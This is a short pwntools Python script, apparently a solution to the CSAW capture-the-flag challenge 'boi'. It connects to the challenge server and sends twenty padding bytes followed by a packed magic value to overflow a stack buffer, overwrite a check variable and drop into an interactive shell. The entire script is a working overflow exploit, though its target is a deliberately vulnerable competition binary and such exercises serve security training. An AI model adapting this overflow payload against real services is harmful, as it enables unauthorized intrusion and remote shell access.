from pwn import *

context.update(arch="amd64")
context.update(log_level="debug")

key = p32(0xcaf3baee)



r = remote("pwn.chal.csaw.io",9000)
i=20
#r=process("../Downloads/boi")
pause()
r.sendline( '\x90' * i+ key )

r.interactive()
